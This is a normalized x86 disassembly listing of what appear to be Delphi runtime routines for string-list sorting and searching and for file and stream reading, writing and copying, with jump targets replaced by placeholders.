mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41baec
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d6f0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419e72
mov eax [ ebp - 0x4 ]
call sub_4195f4
retn
sub_419e9c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41ad14
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419ee7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419eee
mov eax [ ebp - 0x4 ]
call sub_403290
retn
sub_419ef4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419f41
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41aac4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419f48
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_419f54
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_40588c
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_419f88
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419fcb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404200
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419fd2
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_419fd8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a08c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419538
xor edx edx
push ebp
push sub_41a06f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a076
mov eax [ ebp - 0x4 ]
call sub_4195f4
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_4040f8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_41a09c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a138
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test esi esi
jl r-xdata
test esi esi
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a13f
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40402c
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov eax ebx
call sub_41a1d8
mov edx eax
lea eax [ ebp - 0xc ]
call sub_4041f0
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404388
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
sub_41a148
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a1be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41ec5c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41ec64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a1c5
lea eax [ ebp - 0xc ]
call sub_404008
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4203c0
inc esi
dec ebx
jne r-xdata
sub_41a1f0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41a20c
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419370
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404a84
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_41a274
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4196ec
jmp r-xdata
sub_41a310
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404a84
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41a350
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4196ec
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404b70
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41a3bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4196ec
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_4196ec
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41a418
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41a418
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41a43c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_41a4b4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4196ec
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_40405c
pop edi
pop esi
pop ebx
retn
sub_41a4f0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4196ec
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41a518
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41a54c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_419a40
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_41a598
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4196ec
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4196ec
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41a5ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41a518
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_40405c
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028c8
sub_41a664
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4196ec
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4196ec
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_40405c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41a6c0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4196ec
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41a700
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41a418
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41a700
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41a7b0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41a80c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_41a700
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41a860
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41a894
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_41a8f8
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41a94c
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031e0
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
call sub_403a44
mov esp ebp
pop ebp
retn
sub_41a998
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4031d8
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41a94c
pop ecx
mov eax [ ebx ]
call sub_40321c
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41a94c
pop ecx
sub_41aa1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41aa8c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
sub_41aac4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
sub_41aafc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41a880
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026cc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41abd8
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41abdf
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4026ec
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41aa8c
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41aac4
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41abf0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b274
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41ac40
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41d2a8
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ac47
mov eax [ ebp - 0x8 ]
call sub_403290
retn
sub_41ac50
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403260
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_41acac
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_408490
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41acec
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40cbb0
pop ebx
pop ebp
retn 0x8
sub_41ad14
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_41ad58
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_41ad58
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_41ae81
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_4035dc
movzx edx di
mov eax esi
call sub_4083b4
mov ecx eax
xor edx edx
mov eax ebx
call sub_41ac50
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_408430
mov ecx eax
xor edx edx
mov eax ebx
call sub_41ac50
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ae88
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_40402c
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408588
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40af88
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
call sub_403a44
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_408588
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40af88
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
call sub_403a44
jmp r-xdata
sub_41ae88
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_41aeac
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
call sub_4084c8
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_41aee8
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028c8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41af20
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
